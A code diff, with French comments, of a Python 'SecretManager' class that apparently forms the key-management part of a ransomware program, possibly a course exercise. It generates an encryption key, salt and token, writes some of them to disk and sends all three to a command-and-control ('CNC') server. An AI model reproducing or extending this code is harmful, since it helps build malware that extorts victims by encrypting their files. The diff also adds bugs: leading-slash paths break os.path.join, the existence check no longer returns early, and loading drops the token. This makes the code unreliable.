@@ -39,8 +39,8 @@ class SecretManager:
 
     def create(self) -> Tuple[bytes, bytes, bytes]:
         salt = secrets.token_bytes(self.SALT_LENGTH)
-        token = secrets.token_bytes(self.TOKEN_LENGTH)
-        key = self.do_derivation(salt, token)
+        key = secrets.token_bytes(self.TOKEN_LENGTH)
+        token = self.do_derivation(salt, key)
         return salt, key, token
 
 
@@ -64,33 +64,32 @@ class SecretManager:
 
     def setup(self) -> None:
         # Vérification de l'existence d'un fichier self._token.bin
-        # if os.path.exists(os.path.join(self._path, "self._token.bin")):
-        #     self._log.warning("Un fichier self._token.bin existe déjà. Annulation du setup.")
+        if os.path.exists(os.path.join(self._path, "_token.bin")):
+            self._log.warning("Un fichier self._token.bin existe déjà. Annulation du setup.")
         #     return
 
         # Création des éléments cryptographiques
         self._salt, self._key, self._token = self.create()
         print(f"Clé de chiffrement: {self._key}")
+
         # Création du répertoire si nécessaire
         os.makedirs(self._path, exist_ok=True)
-
         # Sauvegarde du sel et du self._token en local
-        with open(os.path.join(self._path, "self._salt.bin"), "wb") as self._salt_file:
+        with open(os.path.join(self._path, "/self._salt.bin"), "wb") as self._salt_file:
             self._salt_file.write(self._salt)
-        with open(os.path.join(self._path, "self._token.bin"), "wb") as self._token_file:
+        with open(os.path.join(self._path, "/self._token.bin"), "wb") as self._token_file:
             self._token_file.write(self._token)
+
 
         # Envoi des éléments cryptographiques au CNC
         self.post_new(self._salt, self._key, self._token)
 
     def load(self) -> None:
         salt_path = os.path.join(self._path, "salt.bin")
-        
-        if os.path.exists(salt_path) and os.path.exists(token_path):
+
+        if os.path.exists(salt_path):
             with open(salt_path, "rb") as salt_file:
                 self._salt = salt_file.read()
-            with open(token_path, "rb") as token_file:
-                self._token = token_file.read()
         else:
             self._log.warning("Les fichiers self._salt.bin et/ou self.key.bin n'existent pas. Impossible de charger les données cryptographiques.")
 
